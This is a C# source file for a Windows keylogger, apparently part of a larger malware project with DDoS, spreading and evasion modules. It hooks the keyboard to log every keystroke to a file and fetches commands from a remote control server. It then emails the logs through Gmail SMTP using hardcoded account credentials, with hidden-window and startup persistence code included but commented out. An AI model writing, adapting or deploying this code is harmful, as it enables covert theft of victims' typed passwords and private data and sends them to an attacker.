﻿using System;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Drawing;
using System.Net.NetworkInformation;
using Karios.DDOS;
using Karios.Spreading;
using Karios.Evading;
using Karios.Surveillance;

namespace Karios
{
    class InterceptKeys
    {
        // ReSharper disable once InconsistentNaming
        private const int WH_KEYBOARD_LL = 13;

        // ReSharper disable once InconsistentNaming
        private const int WM_KEYDOWN = 0x0100;

        private static readonly LowLevelKeyboardProc Proc = HookCallback;
        private static IntPtr _hookId = IntPtr.Zero;
        private static string _localIp;
        private static string _globalTargetIp;
        private static string _website;
        private static bool _online = false;
        public static string Commands = "";
        public static string _emailEndpoint;
        public static string picAttachment;
        public static Bitmap memoryImage;
        public static string _keyOnline;
        private static string pathToLog;
        public static bool EmailSending;

        public static void Main()
        {
            CommandGet();
            if (_online)
            {
                Console.WriteLine("Starting Program...");
                Console.ReadKey();

                // Persitance feature
                // Duplicate();
                // Run on startup
                // SetStartup();
                // Start Application
                // var handle = GetConsoleWindow();
                // ShowWindow(handle, SwHide);
                _hookId = SetHook(Proc);
                Application.Run();
                UnhookWindowsHookEx(_hookId);
            }
        }

        private static void CommandGet()
        {
            try
            {
                const string serverAddress = "http://cutenesss.xyz/server.php";

                var client = new WebClient();

                //var secret = "<3"; //A string to use as the version ID. Use it for testing the client.


                //In future versions, this hash will be secret and enforced - Makes sure everyone is running latest client
                //TODO - Make hash secret and enforced
                var getIterations = -1;
                var target = "";
                var loop = true; // So we can break the loop
                while (loop)
                {
                    if (getIterations != -1 && (target == "" || getIterations <= 9) && target != "") continue;

                    var paramaters = "?";

                    //Tells the server that this is a client, and not a web browser
                    if (paramaters == "?")
                        paramaters = paramaters + "isclient=true";
                    else
                        paramaters = paramaters + "&isclient=true";

                    //Analytical: Tells server this is a new client
                    //(Will probably be implemented in a newer version)
                    //TODO: Make the following if's a single switch statement
                    //Telling the server this is a new client
                    if (paramaters == "?")
                        paramaters = paramaters + "newclient=true";
                    else
                        paramaters = paramaters + "&newclient=true";

                    if (paramaters == "?")
                        paramaters = paramaters + "newclient=false";
                    else
                        paramaters = paramaters + "&newclient=false";

                    // 1 = DDOSOnline
                    if (paramaters == "?")
                        paramaters = paramaters + "ddosonline=true";
                    else
                        paramaters = paramaters + "&ddosonline=true";

                    // 2 = DDOSIP
                    if (paramaters == "?")
                        paramaters = paramaters + "ddosip=true";
                    else
                        paramaters = paramaters + "&ddosip=true";

                    // 3 = KeyloggerOnline
                    if (paramaters == "?")
                        paramaters = paramaters + "keyonline=true";
                    else
                        paramaters = paramaters + "&keyonline=true";

                    // 3 = KeyloggerOnline
                    if (paramaters == "?")
                        paramaters = paramaters + "keyonline=true";
                    else
                        paramaters = paramaters + "&keyonline=true";

                    // 4 = KeyloggerEmail
                    if (paramaters == "?")
                        paramaters = paramaters + "keyloggeremail=true";
                    else
                        paramaters = paramaters + "&keyloggeremail=true";

                    // 5 = CaptureSceen
                    if (paramaters == "?")
                        paramaters = paramaters + "capturescreen=true";
                    else
                        paramaters = paramaters + "&capturescreen=true";

                    // 6 = Startup
                    if (paramaters == "?")
                        paramaters = paramaters + "startup=true";
                    else
                        paramaters = paramaters + "&startup=true";

                    // 7 = Duplication
                    if (paramaters == "?")
                        paramaters = paramaters + "duplication=true";
                    else
                        paramaters = paramaters + "&duplication=true";

                    // 8 = Website
                    if (paramaters == "?")
                        paramaters = paramaters + "website=true";
                    else
                        paramaters = paramaters + "&website=true";

                    // 9 = Reverse
                    if (paramaters == "?")
                        paramaters = paramaters + "reverse=false";
                    else
                        paramaters = paramaters + "&reverse=false";

                    //What this is doing is setting a big string full of commands, then sends it to a server.
                    //The server checks if they contain certain things, then sends back infomation
                    var commands = "";
                    try
                    {
                        commands = client.DownloadString(serverAddress + paramaters);
                    }
                    catch (WebException)
                    {
                    } //TODO: Handle this Exception.

                    var preppedCommand = commands.Split(' ');
                    // <summary>
                    // COMMANDS : IMPORTANT :
                    // 0 = Online
                    // 1 = DDOSOnline
                    // 2 = DDOSIP
                    // 3 = KeyloggerOnline
                    // 4 = Keylogger email
                    // 5 = Capture screen
                    // 6 = Startup
                    // 7  = Duplication
                    // 8 = Website
                    // 9 = Reverses everything
                    // </summary>
                    if (preppedCommand[0] == "Online=True")
                    {
                        _online = true;
                    }
                    else
                    {
                        //_online = false;
                    }

                    _emailEndpoint = preppedCommand[4];
                    _website = preppedCommand[8];
                    //Creates a new button, then clicks it for funsies
                    Button b = new Button();
                    b.Click += LaunchWebsite();
                    b.PerformClick();
                    //LaunchWebsite();
                    loop = false;
                }
            }
            catch
            {
                // ignored
            }
        }

        //setting hooks in keyboard
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (var curProcess = Process.GetCurrentProcess())
            using (var curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            try
            {
                //Console.WriteLine("Recording key works");
                if (nCode < 0 || wParam != (IntPtr)WM_KEYDOWN) return CallNextHookEx(_hookId, nCode, wParam, lParam);
                var appName = AppDomain.CurrentDomain.FriendlyName;
                var vkCode = Marshal.ReadInt32(lParam);
                var fileName = DateTime.Now.ToString("yyyy-MM-dd");
                var machineName = Environment.MachineName;
                // StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
                pathToLog = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\" + fileName + "" +  machineName + ".txt"; // TODO - get more secret location.
                var sw = new StreamWriter(pathToLog, true);
                if ((Keys)vkCode != Keys.Enter)
                {
                    if ((Keys)vkCode == Keys.Space)
                        sw.Write(" ");
                    else
                    {
                        sw.Write(((Keys)vkCode).ToString());
                        Console.Write(((Keys)vkCode).ToString());
                    }
                }
                else
                {
                    sw.WriteLine("");
                    sw.WriteLine((Keys)vkCode);
                    Console.WriteLine((Keys)vkCode);
                }
                sw.Close();
                //Console.WriteLine("Closed");
            }
            catch
            {
                //ignored
            }

            // The Reading part

            if (File.ReadAllLines(pathToLog).Length <= 100) return CallNextHookEx(_hookId, nCode, wParam, lParam);
            {
                if (EmailSending == false)
                {
                    Console.WriteLine("Its sending!");
                    EmailSending = true;
                    SendMail();
                }
            }

            //System.IO.File.Copy(path, Application.StartupPath + @"\log.txt", true);
            // ReSharper disable once UnusedVariable
            //delete log file.
            File.Delete(pathToLog);
            return CallNextHookEx(_hookId, nCode, wParam, lParam);
        }
        public static void SendMail()
        {
            try
            {
                Console.WriteLine("Testing emails");
                MessageBox.Show("Sending Email....");
                var mail = new MailMessage();
                var smtpServer = new SmtpClient("smtp.gmail.com");
                mail.From = new MailAddress("GINGIRULES@gmail.com");
                mail.To.Add(_emailEndpoint);
                mail.Subject = "log from keylogger on " + Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                mail.Body = "New log file from Computer (, finshed at: " + DateTime.Now.ToString("yyyy-MM-dd");
                var attachment = new Attachment(pathToLog);
                mail.Attachments.Add(attachment);
                /*
                CaptureDesktop();
                // Convert it!
                var memStream = new MemoryStream(); //new one
                memoryImage.Save(memStream, ImageFormat.Jpeg);
                var contentType = new ContentType
                {
                    MediaType = MediaTypeNames.Image.Jpeg,
                    Name = "screen"
                };
                mail.Attachments.Add(new Attachment(memStream, contentType));
                */

                // Set ports and stuff
                smtpServer.Port = 587;
                smtpServer.Credentials = new NetworkCredential("GINGIRULES@gmail.com", "G1ng1RuleS");
                smtpServer.EnableSsl = true;
                smtpServer.Send(mail);
                //clear mail attachment
                attachment.Dispose();
                File.Delete(pathToLog);
                EmailSending = false;
            }
            catch
            {
                EmailSending = false;
            }
        }
        static EventHandler LaunchWebsite()
        {
            using (var wc = new WebClient())
            {
                try
                {
                    Process.Start(_website); //PreppedCommand[8]
                }
                catch
                {
                    // ignored
                }

                return null;
            }
        }

        public static void Testing()
        {
            var runUsb = new USB();
        }





        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        //This imports the DLL's needed for some stuff
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        private const int SwHide = 0;
    }
}
